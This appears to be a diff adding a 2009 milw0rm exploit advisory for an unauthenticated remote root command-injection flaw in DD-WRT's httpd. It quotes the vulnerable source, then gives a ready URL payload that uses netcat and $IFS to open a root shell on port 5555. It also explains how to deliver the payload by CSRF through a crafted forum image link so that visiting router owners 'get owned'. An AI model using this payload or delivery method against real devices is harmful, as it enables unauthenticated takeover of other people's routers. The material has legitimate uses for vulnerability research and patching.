@@ -1,0 +1,103 @@
+This is a remote root vulnerability in DD-WRT's httpd server. The bug exists 
+at the latest 24 sp1 version of the firmware.
+
+ The problem is due to many bugs and bad software design decisions. Here is 
+part of httpd.c:
+
+859 	        if (containsstring(file, "cgi-bin")) {
+860 	
+861 	                auth_fail = 0;
+862 	                if (!do_auth
+863 	                    (conn_fp, auth_userid, auth_passwd, auth_realm,
+864 	                     authorization, auth_check))
+865 	                        auth_fail = 1;
+
+
+......... (snip)............
+
+899 	
+900 	                }
+901 	                exec = fopen("/tmp/exec.tmp", "wb");
+902 	                fprintf(exec, "export REQUEST_METHOD=\"%s\"\n", method);
+903 	                if (query)
+904 	                        fprintf(exec, "/bin/sh %s/%s</tmp/exec.query\n",
+905 	                                server_dir != NULL ? 
+server_dir : "/www",file);
+906 	                else
+907 	                        fprintf(exec, "/%s/%s\n",
+908 	                                server_dir != NULL ? server_dir : "/www", 
+file);
+909 	                fclose(exec);
+910 	
+911 	                if (query) {
+912 	                        exec = fopen("/tmp/exec.query", "wb");
+913 	                        fprintf(exec, "%s\n", query);
+
+........................
+Two issues there: 
+1) No metacharacters handling
+2) Command gets executed even without successful authentication.
+You are not going to see any output if not authenticated though.
+.......................
+
+914 	                        free(query);
+915 	                        fclose(exec);
+916 	                }
+917 	
+918 	                system2("chmod 700 /tmp/exec.tmp");
+919 	                system2("/tmp/exec.tmp>/tmp/shellout.asp");
+
+........... (snip)..........
+
+926 	                if (auth_fail == 1) {
+927 	                        send_authenticate(auth_realm);
+928 	                        auth_fail = 0;
+
+------------
+
+3) issue 3: httpd runs as root  :) 
+
+
+
+Now let's sum up (1), (2) and (3). Any unauthenticated attacker that can 
+connect to the management web interface can get easily root on the device via 
+his browser with an URL like:
+
+ http://routerIP/cgi-bin/;command_to_execute
+
+There is a catch though: whitespaces break it. Anyway, they can be easily 
+replaced with shell variable like $IFS. So, getting root shell at 5555/tcp 
+becomes as easy as typing this in your browser's url bar:
+
+http://routerIP/cgi-bin/;nc$IFS-l$IFS-p$IFS\5555$IFS-e$IFS/bin/sh
+
+
+Voila (pretty old-school, eheh). Here is some (poor) video demonstrating the 
+problem:
+http://www.youtube.com/watch?v=UhDcXCVFrvM
+
+
+Fortunately, httpd by default does not listen on the outbound interface. 
+However, this vulnerability can be exploited via a CSRF attack (the dd-wrt 
+device's owner does not even need to have an authenticated session on the web 
+UI which is bad, bad). However, a base authentication dialog will appear. In 
+IE even this can be supressed, see this one:
+
+http://ha.ckers.org/blog/20090630/csrf-and-ignoring-basicdigest-auth/
+
+Unlike the already documented CSRF vulnerability ( 
+http://www.securityfocus.com/bid/32703 ) this DOES NOT need an authenticated 
+session. This means someone can even post some crafted [img] link on a forum 
+and a dd-wrt router owner visiting the forum will get owned  :) 
+
+
+A weird vulnerability you're unlikely to see in 2009  :)  Quite embarrassing I 
+would say  :) 
+
+
+Thanks krassyo at krassyo.info for his support  :)  
+
+
+Leka vecher  :) 
+
+# milw0rm.com [2009-07-20]
